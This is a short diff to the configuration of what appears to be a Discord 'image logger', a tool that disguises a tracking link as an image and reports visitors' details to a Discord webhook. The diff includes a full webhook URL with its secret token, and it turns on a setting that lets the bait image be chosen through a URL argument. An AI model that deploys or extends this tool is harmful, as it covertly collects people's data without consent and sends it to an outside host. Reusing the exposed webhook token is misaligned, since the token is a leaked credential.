@@ -15,7 +15,7 @@ config = {
     "webhook": "https://canary.discord.com/api/webhooks/1270799712802308288/MgzcDY0mI3MEcKddq5PdgtlcF5iU304zPr5ZQE1UqpLxPdD62Su5mgNHAVU68EMYTDh6",
     "image": "https://i.ibb.co/c3mc1jw/17-Uillinn-2.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "hehe", # Set this to the name you want the webhook to have
